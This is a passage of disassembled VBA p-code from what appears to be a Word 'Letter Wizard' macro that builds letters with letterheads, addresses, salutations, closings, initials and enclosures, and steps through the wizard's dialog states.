\n' Line #822:\n' \tLd WordBasic \n' \tArgsMemCall WW6_EditClear 0x0000 \n' Line #823:\n' \tLitStr 0x000D \"UseLetterhead\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tLitDI2 0x0000 \n' \tEq \n' \tIfBlock \n' Line #824:\n' \tLitStr 0x0013 \"textLetterheadSpace\"\n' \tLd WordBasic \n' \tArgsMemLd [DlgText$] 0x0001 \n' \tSt T$ \n' Line #825:\n' \tOnError <crash> \n' \tBoS 0x0000 \n' \tOnError LBadMeasurement \n' Line #826:\n' \tLitStr 0x0012 \"LetterHeadPosition\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tSelectCase \n' Line #827:\n' \tLitDI2 0x0000 \n' \tCase \n' \tCaseDone \n' \tQuoteRem 0x0014 0x000B \" at the top\"\n' Line #828:\n' \tLd T$ \n' \tParamNamed TopMargin \n' \tLd WordBasic \n' \tArgsMemCall FilePageSetup 0x0001 \n' Line #829:\n' \tLitDI2 0x0001 \n' \tCase \n' \tCaseDone \n' \tQuoteRem 0x0016 0x000C \" on the left\"\n' Line #830:\n' \tLd T$ \n' \tParamNamed LeftMargin \n' \tLd WordBasic \n' \tArgsMemCall FilePageSetup 0x0001 \n' Line #831:\n' \tLitDI2 0x0002 \n' \tCase \n' \tCaseDone \n' \tQuoteRem 0x0014 0x000D \" on the right\"\n' Line #832:\n' \tLd T$ \n' \tParamNamed RightMargin \n' \tLd WordBasic \n' \tArgsMemCall FilePageSetup 0x0001 \n' Line #833:\n' \tEndSelect \n' Line #834:\n' \tGoTo LDoneLetterhead \n' Line #835:\n' \tLabel LBadMeasurement \n' Line #836:\n' \tLd emptyDoc$ \n' \tLd WordBasic \n' \tArgsMemCall DlgFilePreview 0x0001 \n' Line #837:\n' \tLitDI2 0x0002 \n' \tLd WordBasic \n' \tArgsMemCall DocClose 0x0001 \n' \tQuoteRem 0x001D 0x0028 \"Close the working document(w/out saving)\"\n' Line #838:\n' \tStop \n' Line #839:\n' \tLabel LDoneLetterhead \n' Line #840:\n' \tOnError <crash> \n' \tBoS 0x0000 \n' \tOnError (GoTo 0) \n' Line #841:\n' \tEndIfBlock \n' Line #842:\n' \tLd WordBasic \n' \tArgsMemCall InsertPara 0x0000 \n' Line #843:\n' \tQuoteRem 0x0000 0x0055 \"Hey, this would be a good time to figure out where the return address/date should go:\"\n' Line #844:\n' \tLd rtDistToLftDist \n' \tArgsLd RightDistanceToLeftDistance$ 0x0001 \n' \tSt DateTabPlace$ \n' \tQuoteRem 0x0042 0x001D \"1.25\" from the right is what?\"\n' Line #845:\n' \tQuoteRem 0x0004 0x0043 \"InsertPara'we're starting *after* return address/date (if included)\"\n' Line #846:\n' \tLitDI2 0x000B \n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tLitDI2 0x0001 \n' \tNe \n' \tIfBlock \n' \tQuoteRem 0x0028 0x001A \"it's not a personal letter\"\n' Line #847:\n' \tLitStr 0x0009 \"recipaddr\"\n' \tLitDI2 0x0001 \n' \tParamNamed Add \n' \tLd WordBasic \n' \tArgsMemCall EditBookmark 0x0002 \n' Line #848:\n' \tLd kStyInsideAddr$ \n' \tLd WordBasic \n' \tArgsMemCall Style 0x0001 \n' Line #849:\n' \tLitStr 0x0014 \"textRecipientAddress\"\n' \tLd WordBasic \n' \tArgsMemLd [DlgText$] 0x0001 \n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' \tQuoteRem 0x0046 0x000D \"includes name\"\n' Line #850:\n' \tLd WordBasic \n' \tArgsMemCall InsertPara 0x0000 \n' Line #851:\n' \tQuoteRem 0x0004 0x001A \"InsertPara  DAPFEL removed\"\n' Line #852:\n' \tEndIfBlock \n' Line #853:\n' \tLd kStySal$ \n' \tLd WordBasic \n' \tArgsMemCall Style 0x0001 \n' Line #854:\n' \tLd kDear$ \n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' \tQuoteRem 0x001C 0x001F \"+ DlgText$(\"textRecipientName\")\"\n' Line #855:\n' \tLitStr 0x0009 \"recipient\"\n' \tLitDI2 0x0001 \n' \tParamNamed Add \n' \tLd WordBasic \n' \tArgsMemCall EditBookmark 0x0002 \n' Line #856:\n' \tLd kRecipient$ \n' \tArgsCall InsertRedSlot 0x0001 \n' Line #857:\n' \tQuoteRem 0x0004 0x002F \"lenrecip = Len(kRecipient$) + 2    ' 2 for [, ]\"\n' Line #858:\n' \tLitDI2 0x000B \n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tLitDI2 0x0001 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLitStr 0x0001 \",\"\n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' \tElse \n' \tBoSImplicit \n' \tLitStr 0x0001 \":\"\n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' \tEndIf \n' Line #859:\n' \tLd WordBasic \n' \tArgsMemCall InsertPara 0x0000 \n' Line #860:\n' \tLitStr 0x0007 \"chkloID\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tLitDI2 0x000B \n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tLitDI2 0x0001 \n' \tNe \n' \tParen \n' \tAnd \n' \tIfBlock \n' Line #861:\n' \tLd kStySubjLine$ \n' \tLd WordBasic \n' \tArgsMemCall Style 0x0001 \n' Line #862:\n' \tLd kRE$ \n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' Line #863:\n' \tLd kAccountID$ \n' \tArgsCall InsertRedSlot 0x0001 \n' Line #864:\n' \tLd WordBasic \n' \tArgsMemCall InsertPara 0x0000 \n' Line #865:\n' \tEndIfBlock \n' Line #866:\n' \tLd kStyBodyText$ \n' \tLd WordBasic \n' \tArgsMemCall Style 0x0001 \n' Line #867:\n' \tLitStr 0x000A \"letterbody\"\n' \tLitDI2 0x0001 \n' \tParamNamed Add \n' \tLd WordBasic \n' \tArgsMemCall EditBookmark 0x0002 \n' Line #868:\n' \tLd kTypeHere$ \n' \tArgsCall InsertRedSlot 0x0001 \n' Line #869:\n' \tLd WordBasic \n' \tArgsMemCall InsertPara 0x0000 \n' Line #870:\n' \tLitDI2 0x0001 \n' \tParamNamed ClearAll \n' \tLd WordBasic \n' \tArgsMemCall FormatTabs 0x0001 \n' Line #871:\n' \tLd DateTabPlace$ \n' \tParamNamed Position \n' \tLitDI2 0x0001 \n' \tParamNamed Sgn \n' \tLd WordBasic \n' \tArgsMemCall FormatTabs 0x0002 \n' Line #872:\n' \tLitStr 0x0004 \"\u00b5\u00b2\u00bby\"\n' \tLd WordBasic \n' \tArgsMemCall Style 0x0001 \n' Line #873:\n' \tLitDI2 0x000B \n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tLitDI2 0x0001 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLd kClosePersonal$ \n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' \tElse \n' \tBoSImplicit \n' \tLd kCloseBusiness$ \n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' \tEndIf \n' Line #874:\n' \tLd WordBasic \n' \tArgsMemCall InsertPara 0x0000 \n' \tQuoteRem 0x001C 0x0017 \"space for writer's name\"\n' Line #875:\n' \tLitDI2 0x000B \n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tLitDI2 0x0001 \n' \tNe \n' \tIfBlock \n' \tQuoteRem 0x0028 0x000F \"if not personal\"\n' Line #876:\n' \tLd WordBasic \n' \tArgsMemCall InsertPara 0x0000 \n' Line #877:\n' \tLd kStyRefIntls$ \n' \tLd WordBasic \n' \tArgsMemCall Style 0x0001 \n' Line #878:\n' \tLitStr 0x0013 \"chkloWriterInitials\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tIfBlock \n' Line #879:\n' \tLd kWritersInitials$ \n' \tArgsCall InsertRedSlot 0x0001 \n' Line #880:\n' \tLitStr 0x0013 \"chkloTypistInitials\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tIf \n' \tBoSImplicit \n' \tLitStr 0x0001 \"/\"\n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' \tElse \n' \tBoSImplicit \n' \tLd WordBasic \n' \tArgsMemCall InsertPara 0x0000 \n' \tEndIf \n' Line #881:\n' \tEndIfBlock \n' Line #882:\n' \tLitStr 0x0013 \"chkloTypistInitials\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tIfBlock \n' Line #883:\n' \tLd kTypistsInitials$ \n' \tArgsCall InsertRedSlot 0x0001 \n' Line #884:\n' \tLd WordBasic \n' \tArgsMemCall InsertPara 0x0000 \n' Line #885:\n' \tEndIfBlock \n' Line #886:\n' \tLitStr 0x0007 \"chkloCC\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tIfBlock \n' Line #887:\n' \tLd kStyCC$ \n' \tLd WordBasic \n' \tArgsMemCall Style 0x0001 \n' Line #888:\n' \tLd kCC$ \n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' Line #889:\n' \tLd kNames$ \n' \tArgsCall InsertRedSlot 0x0001 \n' Line #890:\n' \tLd WordBasic \n' \tArgsMemCall InsertPara 0x0000 \n' Line #891:\n' \tEndIfBlock \n' Line #892:\n' \tLd kStyEncl$ \n' \tLd WordBasic \n' \tArgsMemCall Style 0x0001 \n' Line #893:\n' \tLitStr 0x000F \"chkloEnclosures\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tIfBlock \n' Line #894:\n' \tLd kEnclosures$ \n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' Line #895:\n' \tLd kNumber$ \n' \tArgsCall InsertRedSlot 0x0001 \n' Line #896:\n' \tLd WordBasic \n' \tArgsMemCall InsertPara 0x0000 \n' Line #897:\n' \tEndIfBlock \n' Line #898:\n' \tLitStr 0x0010 \"chkloAttachments\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tIfBlock \n' Line #899:\n' \tLd kAttachments$ \n' \tLitDI2 0x000D \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' Line #900:\n' \tEndIfBlock \n' Line #901:\n' \tEndIfBlock \n' \tQuoteRem 0x000B 0x000C \"not personal\"\n' Line #902:\n' \tLd WordBasic \n' \tArgsMemCall StartOfDocument 0x0000 \n' \tQuoteRem 0x001F 0x0015 \" go back to the start\"\n' Line #903:\n' \tLitStr 0x000C \"LetterMethod\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tLitDI2 0x0001 \n' \tEq \n' \tIfBlock \n' \tQuoteRem 0x0033 0x0008 \"Personal\"\n' Line #904:\n' \tLitStr 0x0008 \"WizStyle\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tLitDI2 0x0001 \n' \tEq \n' \tIfBlock \n' \tQuoteRem 0x0033 0x0012 \"Contemporary Style\"\n' Line #905:\n' \tLitStr 0x0009 \"cntmpgfx2\"\n' \tParamNamed New \n' \tLitDI2 0x0001 \n' \tParamNamed Insert \n' \tLd WordBasic \n' \tArgsMemCall WW7_EditAutoText 0x0002 \n' Line #906:\n' \tLd WordBasic \n' \tArgsMemCall StartOfDocument 0x0000 \n' Line #907:\n' \tEndIfBlock \n' \tQuoteRem 0x000F 0x0012 \"Contemporary Style\"\n' Line #908:\n' \tElseBlock \n' \tQuoteRem 0x0009 0x000F \"if not personal\"\n' Line #909:\n' \tLitStr 0x000D \"UseLetterhead\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tLitDI2 0x0001 \n' \tEq \n' \tIfBlock \n' Line #910:\n' \tLd kStyCmpnyName$ \n' \tLd WordBasic \n' \tArgsMemCall Style 0x0001 \n' Line #911:\n' \tLd kTypeCompanyName$ \n' \tArgsCall InsertRedSlot 0x0001 \n' Line #912:\n' \tLitStr 0x0008 \"WizStyle\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tLitDI2 0x0001 \n' \tEq \n' \tParen \n' \tIfBlock \n' Line #913:\n' \tLitStr 0x0009 \"cntmpgfx2\"\n' \tParamNamed New \n' \tLitDI2 0x0001 \n' \tParamNamed Insert \n' \tLd WordBasic \n' \tArgsMemCall WW7_EditAutoText 0x0002 \n' Line #914:\n' \tLd kStyCmpnyName$ \n' \tLd WordBasic \n' \tArgsMemCall Style 0x0001 \n' Line #915:\n' \tElseBlock \n' Line #916:\n' \tLd WordBasic \n' \tArgsMemCall InsertPara 0x0000 \n' Line #917:\n' \tEndIfBlock \n' \tQuoteRem 0x0013 0x000A \"Wizstyle=1\"\n' Line #918:\n' \tLd kStyRetAddr$ \n' \tLd WordBasic \n' \tArgsMemCall Style 0x0001 \n' Line #919:\n' \tArgsCall ParseRetAddress 0x0000 \n' Line #920:\n' \tLitStr 0x0008 \"WizStyle\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tLitDI2 0x0002 \n' \tNe \n' \tParen \n' \tIfBlock \n' \tQuoteRem 0x003A 0x0018 \" Cntmp or Prof let style\"\n' Line #921:\n' \tStartForVariable \n' \tLd ii \n' \tEndForVariable \n' \tLitDI2 0x0000 \n' \tLitDI2 0x0003 \n' \tFor \n' Line #922:\n' \tLd ii \n' \tArgsLd RetAddress__$ 0x0001 \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tParen \n' \tIfBlock \n' Line #923:\n' \tLd ii \n' \tArgsLd RetAddress__$ 0x0001 \n' \tLitDI2 0x000D \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' Line #924:\n' \tElseBlock \n' Line #925:\n' \tLitDI2 0x000D \n' \tArgsLd Chr 0x0001 \n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' Line #926:\n' \tEndIfBlock \n' \tQuoteRem 0x001B 0x000D \"RetAddress...\"\n' Line #927:\n' \tStartForVariable \n' \tLd ii \n' \tEndForVariable \n' \tNextVar \n' Line #928:\n' \tLitDI2 0x0004 \n' \tArgsLd RetAddress__$ 0x0001 \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLitDI2 0x0004 \n' \tArgsLd RetAddress__$ 0x0001 \n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' \tEndIf \n' Line #929:\n' \tElseBlock \n' \tQuoteRem 0x0011 0x000D \"elegant style\"\n' Line #930:\n' \tStartForVariable \n' \tLd ii \n' \tEndForVariable \n' \tLitDI2 0x0000 \n' \tLitDI2 0x0003 \n' \tFor \n' Line #931:\n' \tLd ii \n' \tArgsLd RetAddress__$ 0x0001 \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tParen \n' \tIfBlock \n' Line #932:\n' \tLd ii \n' \tArgsLd RetAddress__$ 0x0001 \n' \tLitStr 0x0004 \" \u00a1E \"\n' \tAdd \n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' Line #933:\n' \tElseBlock \n' Line #934:\n' \tQuoteRem 0x0018 0x000A \"Do Nothing\"\n' Line #935:\n' \tEndIfBlock \n' \tQuoteRem 0x001B 0x000D \"RetAddress...\"\n' Line #936:\n' \tStartForVariable \n' \tLd ii \n' \tEndForVariable \n' \tNextVar \n' Line #937:\n' \tLitDI2 0x0004 \n' \tArgsLd RetAddress__$ 0x0001 \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tIfBlock \n' Line #938:\n' \tLitDI2 0x0004 \n' \tArgsLd RetAddress__$ 0x0001 \n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' Line #939:\n' \tElseBlock \n' Line #940:\n' \tLitDI2 0x0003 \n' \tUMi \n' \tLd WordBasic \n' \tArgsMemCall WW6_EditClear 0x0001 \n' \tQuoteRem 0x002F 0x0016 \"get rid of last bullet\"\n' Line #941:\n' \tEndIfBlock \n' Line #942:\n' \tEndIfBlock \n' Line #943:\n' \tEndIfBlock \n' \tQuoteRem 0x000F 0x000A \"LetterHead\"\n' Line #944:\n' \tEndIfBlock \n' \tQuoteRem 0x000B 0x000B \"NotPersonal\"\n' Line #945:\n' \tLitStr 0x0009 \"chkloDate\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tLitDI2 0x0001 \n' \tEq \n' \tIfBlock \n' Line #946:\n' \tLitDI2 0x000D \n' \tArgsLd Chr 0x0001 \n' \tLd WordBasic \n' \tArgsMemCall Insert 0x0001 \n' Line #947:\n' \tLd kStyDate$ \n' \tLd WordBasic \n' \tArgsMemCall Style 0x0001 \n' Line #948:\n' \tLd kFormalDateFormat$ \n' \tLd WordBasic \n' \tArgsMemCall InsertDateTime 0x0001 \n' Line #949:\n' \tEndIfBlock \n' Line #950:\n' \tLabel LPrewrittenContinue \n' Line #951:\n' \tLd WordBasic \n' \tArgsMemCall StartOfDocument 0x0000 \n' Line #952:\n' \tLd WordBasic \n' \tArgsMemCall ViewPage 0x0000 \n' Line #953:\n' \tLitDI2 0x0001 \n' \tParamNamed AutoFit \n' \tLd WordBasic \n' \tArgsMemCall ViewZoom 0x0001 \n' Line #954:\n' \tLitDI2 0x000B \n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tLitDI2 0x0000 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd WordBasic \n' \tArgsMemCall CharRight 0x0002 \n' \tEndIf \n' \tQuoteRem 0x0040 0x0013 \"select Company Name\"\n' Line #955:\n' \tEndSub \n' Line #956:\n' Line #957:\n' \tFuncDefn (Private Sub PickStylePreview())\n' Line #958:\n' \tLd WordBasic \n' \tArgsMemCall StartOfDocument 0x0000 \n' Line #959:\n' \tLd WordBasic \n' \tArgsMemCall EditSelectAll 0x0000 \n' Line #960:\n' \tLd WordBasic \n' \tArgsMemCall WW6_EditClear 0x0000 \n' Line #961:\n' \tArgsCall DoStyleMerge 0x0000 \n' Line #962:\n' \tLitStr 0x0008 \"WizStyle\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tSelectCase \n' Line #963:\n' \tLitDI2 0x0000 \n' \tCase \n' \tCaseDone \n' Line #964:\n' \tLd kGallery$ \n' \tLitDI2 0x0001 \n' \tParamNamed Insert \n' \tLd WordBasic \n' \tArgsMemCall WW7_EditAutoText 0x0002 \n' Line #965:\n' \tLitDI2 0x0001 \n' \tCase \n' \tCaseDone \n' Line #966:\n' \tLitStr 0x000D \"UseLetterhead\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tLitDI2 0x0001 \n' \tEq \n' \tIfBlock \n' Line #967:\n' \tLitStr 0x0009 \"cntmpgfx2\"\n' \tParamNamed New \n' \tLitDI2 0x0001 \n' \tParamNamed Insert \n' \tLd WordBasic \n' \tArgsMemCall WW7_EditAutoText 0x0002 \n' Line #968:\n' \tLd WordBasic \n' \tArgsMemCall StartOfDocument 0x0000 \n' Line #969:\n' \tEndIfBlock \n' Line #970:\n' \tLd kGallery$ \n' \tLitDI2 0x0001 \n' \tParamNamed Insert \n' \tLd WordBasic \n' \tArgsMemCall WW7_EditAutoText 0x0002 \n' Line #971:\n' \tLitDI2 0x0002 \n' \tCase \n' \tCaseDone \n' Line #972:\n' \tLd kGallery$ \n' \tLitDI2 0x0001 \n' \tParamNamed Insert \n' \tLd WordBasic \n' \tArgsMemCall WW7_EditAutoText 0x0002 \n' Line #973:\n' \tEndSelect \n' Line #974:\n' \tEndSub \n' Line #975:\n' Line #976:\n' \tFuncDefn (Private Sub DoStyleMerge())\n' Line #977:\n' \tDim \n' \tVarDefn n\n' Line #978:\n' \tLitStr 0x0000 \"\"\n' \tSt n$ \n' Line #979:\n' \tLitStr 0x0008 \"WizStyle\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tSelectCase \n' Line #980:\n' \tLitDI2 0x0000 \n' \tCase \n' \tCaseDone \n' Line #981:\n' \tLd proflett$ \n' \tSt n$ \n' Line #982:\n' \tLd kFtrDist1$ \n' \tLitDI2 0x0022 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tParamNamed FooterDistance \n' \tLd WordBasic \n' \tArgsMemCall FilePageSetup 0x0001 \n' Line #983:\n' \tLitDI2 0x0001 \n' \tCase \n' \tCaseDone \n' Line #984:\n' \tLd cntmplet$ \n' \tSt n$ \n' Line #985:\n' \tLd kFtrDist2$ \n' \tLitDI2 0x0022 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tParamNamed FooterDistance \n' \tLd WordBasic \n' \tArgsMemCall FilePageSetup 0x0001 \n' Line #986:\n' \tLitDI2 0x0002 \n' \tCase \n' \tCaseDone \n' Line #987:\n' \tLd eleglett$ \n' \tSt n$ \n' Line #988:\n' \tLd kFtrDist1$ \n' \tLitDI2 0x0022 \n' \tArgsLd Chr 0x0001 \n' \tAdd \n' \tParamNamed FooterDistance \n' \tLd WordBasic \n' \tArgsMemCall FilePageSetup 0x0001 \n' Line #989:\n' \tEndSelect \n' Line #990:\n' \tLitDI2 0x0001 \n' \tLd WordBasic \n' \tArgsMemCall WaitCursor 0x0001 \n' Line #991:\n' \tOnError <crash> \n' \tBoS 0x0000 \n' \tOnError LStyleMissing \n' Line #992:\n' \tLd n$ \n' \tParamNamed Template \n' \tLd WordBasic \n' \tArgsMemCall FormatStyleGallery 0x0001 \n' Line #993:\n' \tLd WordBasic \n' \tArgsMemCall DlgUpdateFilePreview 0x0000 \n' Line #994:\n' \tGoTo LContinue1 \n' Line #995:\n' \tLabel LStyleMissing \n' Line #996:\n' \tLd kErrStyleNotFound1$ \n' \tLd n$ \n' \tAdd \n' \tLd kErrStyleNotFound2$ \n' \tAdd \n' \tLd wizname$ \n' \tLitDI2 0x0030 \n' \tLd WordBasic \n' \tArgsMemCall MsgBox 0x0003 \n' Line #997:\n' \tLabel LContinue1 \n' Line #998:\n' \tOnError <crash> \n' \tBoS 0x0000 \n' \tOnError (GoTo 0) \n' Line #999:\n' \tLitDI2 0x0000 \n' \tLd WordBasic \n' \tArgsMemCall WaitCursor 0x0001 \n' Line #1000:\n' \tEndSub \n' Line #1001:\n' Line #1002:\n' \tFuncDefn (Private Sub ParseRetAddress())\n' Line #1003:\n' \tDim \n' \tVarDefn i\n' Line #1004:\n' \tDim \n' \tVarDefn temp\n' Line #1005:\n' \tDim \n' \tVarDefn iPos\n' Line #1006:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0000 \n' \tLitDI2 0x0007 \n' \tFor \n' Line #1007:\n' \tLitStr 0x0000 \"\"\n' \tLd i \n' \tArgsSt RetAddress__$ 0x0001 \n' Line #1008:\n' \tStartForVariable \n' \tNext \n' Line #1009:\n' \tLitDI2 0x0000 \n' \tSt i \n' Line #1010:\n' \tLitStr 0x0011 \"textReturnAddress\"\n' \tLd WordBasic \n' \tArgsMemLd [DlgText$] 0x0001 \n' \tSt temp$ \n' Line #1011:\n' \tLd temp$ \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tIfBlock \n' Line #1012:\n' \tLd temp$ \n' \tLitDI2 0x000D \n' \tArgsLd Chr 0x0001 \n' \tFnInStr \n' \tSt iPos \n' Line #1013:\n' \tLd iPos \n' \tLd i \n' \tLitDI2 0x0007 \n' \tLt \n' \tParen \n' \tAnd \n' \tWhile \n' Line #1014:\n' \tLd iPos \n' \tLd temp$ \n' \tFnLen \n' \tLt \n' \tIfBlock \n' Line #1015:\n' \tLd temp$ \n' \tLd iPos \n' \tLitDI2 0x0001 \n' \tSub \n' \tLd WordBasic \n' \tArgsMemLd [Left$] 0x0002 \n' \tLd i \n' \tArgsSt RetAddress__$ 0x0001 \n' Line #1016:\n' \tLd temp$ \n' \tLd iPos \n' \tLitDI2 0x0001 \n' \tAdd \n' \tArgsLd Mid$ 0x0002 \n' \tSt temp$ \n' Line #1017:\n' \tLd temp$ \n' \tLitDI2 0x000D \n' \tArgsLd Chr 0x0001 \n' \tFnInStr \n' \tSt iPos \n' Line #1018:\n' \tLd i \n' \tLitDI2 0x0001 \n' \tAdd \n' \tSt i \n' Line #1019:\n' \tElseBlock \n' Line #1020:\n' \tLd temp$ \n' \tFnLen \n' \tLitDI2 0x0001 \n' \tGt \n' \tIfBlock \n' Line #1021:\n' \tLd temp$ \n' \tLd iPos \n' \tLitDI2 0x0001 \n' \tSub \n' \tLd WordBasic \n' \tArgsMemLd [Left$] 0x0002 \n' \tLd i \n' \tArgsSt RetAddress__$ 0x0001 \n' Line #1022:\n' \tLd i \n' \tLitDI2 0x0001 \n' \tAdd \n' \tSt i \n' Line #1023:\n' \tEndIfBlock \n' Line #1024:\n' \tLitStr 0x0000 \"\"\n' \tSt temp$ \n' Line #1025:\n' \tLitDI2 0x0000 \n' \tSt iPos \n' Line #1026:\n' \tEndIfBlock \n' Line #1027:\n' \tWend \n' Line #1028:\n' \tLd temp$ \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tIfBlock \n' Line #1029:\n' \tLd temp$ \n' \tLd i \n' \tArgsSt RetAddress__$ 0x0001 \n' Line #1030:\n' \tLd i \n' \tLitDI2 0x0001 \n' \tAdd \n' \tSt i \n' Line #1031:\n' \tEndIfBlock \n' Line #1032:\n' \tEndIfBlock \n' Line #1033:\n' Line #1034:\n' \tLd i \n' \tSt RetAddressLines \n' Line #1035:\n' \tEndSub \n' Line #1036:\n' Line #1037:\n' Line #1038:\n' \tQuoteRem 0x0000 0x0027 \"%% NextState : Determine the next state\"\n' Line #1039:\n' \tFuncDefn (Private Function NextState(oldState))\n' \tQuoteRem 0x0028 0x0025 \"Determine state that follows oldState\"\n' Line #1040:\n' \tDim \n' \tVarDefn LetterMethod\n' Line #1041:\n' \tDim \n' \tVarDefn UseLetterhead\n' Line #1042:\n' \tLitDI2 0x000B \n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tSt LetterMethod \n' Line #1043:\n' \tLitStr 0x000D \"UseLetterhead\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tSt UseLetterhead \n' Line #1044:\n' \tLd oldState \n' \tLitDI2 0x0003 \n' \tEq \n' \tLd UseLetterhead \n' \tLitDI2 0x0000 \n' \tNe \n' \tAnd \n' \tLd LetterMethod \n' \tLitDI2 0x0001 \n' \tEq \n' \tAnd \n' \tIfBlock \n' Line #1045:\n' \tLd oldState \n' \tLitDI2 0x0003 \n' \tAdd \n' \tSt NextState \n' Line #1046:\n' \tLd oldState \n' \tLitDI2 0x0003 \n' \tEq \n' \tLd UseLetterhead \n' \tLitDI2 0x0000 \n' \tNe \n' \tAnd \n' \tElseIfBlock \n' Line #1047:\n' \tLd oldState \n' \tLitDI2 0x0002 \n' \tAdd \n' \tSt NextState \n' Line #1048:\n' \tLd oldState \n' \tLitDI2 0x0004 \n' \tEq \n' \tLd LetterMethod \n' \tLitDI2 0x0001 \n' \tEq \n' \tAnd \n' \tElseIfBlock \n' Line #1049:\n' \tLd oldState \n' \tLitDI2 0x0002 \n' \tAdd \n' \tSt NextState \n' Line #1050:\n' \tElseBlock \n' Line #1051:\n' \tLd oldState \n' \tLitDI2 0x0001 \n' \tAdd \n' \tSt NextState \n' \tQuoteRem 0x0021 0x0007 \"default\"\n' Line #1052:\n' \tEndIfBlock \n' Line #1053:\n' \tEndFunc \n' \tQuoteRem 0x000D 0x0009 \"NextState\"\n' Line #1054:\n' Line #1055:\n' \tQuoteRem 0x0000 0x002C \"%% PrevState : Determine the preceding state\"\n' Line #1056:\n' \tFuncDefn (Private Function PrevState(oldState))\n' Line #1057:\n' \tDim \n' \tVarDefn LetterMethod\n' Line #1058:\n' \tDim \n' \tVarDefn UseLetterhead\n' Line #1059:\n' \tLitDI2 0x000B \n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tSt LetterMethod \n' Line #1060:\n' \tLitStr 0x000D \"UseLetterhead\"\n' \tLd WordBasic \n' \tArgsMemLd DlgValue 0x0001 \n' \tSt UseLetterhead \n' Line #1061:\n' \tLd oldState \n' \tLitDI2 0x0006 \n' \tEq \n' \tLd LetterMethod \n' \tLitDI2 0x0001 \n' \tEq \n' \tAnd \n' \tLd UseLetterhead \n' \tLitDI2 0x0000 \n' \tNe \n' \tAnd \n' \tIfBlock \n' Line #1062:\n' \tLd oldState \n' \tLitDI2 0x0003 \n' \tSub \n' \tSt PrevState \n' Line #1063:\n' \tLd oldState \n' \tLitDI2 0x0006 \n' \tEq \n' \tLd LetterMethod \n' \tLitDI2 0x0001 \n' \tEq \n' \tAnd \n' \tElseIfBlock \n' Line #1064:\n' \tLd oldState \n' \tLitDI2 0x0002 \n' \tSub \n' \tSt PrevState \n' Line #1065:\n' \tLd oldState \n' \tLitDI2 0x0005 \n' \tEq \n' \tLd UseLetterhead \n' \tLitDI2 0x0000 \n' \tNe \n' \tAnd \n' \tElseIfBlock \n' Line #1066:\n' \tLd oldState \n' \tLitDI2 0x0002 \n' \tSub \n' \tSt PrevState \n' Line #1067:\n' \tElseBlock \n' Line #1068:\n' \tLd oldState \n' \tLitDI2 0x0001 \n' \tSub \n' \tSt PrevState \n' \tQuoteRem 0x0021 0x0007 \"Default\"\n' Line #1069:\n' \tEndIfBlock \n' Line #1070:\n' \tEndFunc \n' \tQuoteRem 0x000D 0x0009 \"PrevState\"\n' Line #1071:\n' Line #1072:\n' \tFuncDefn 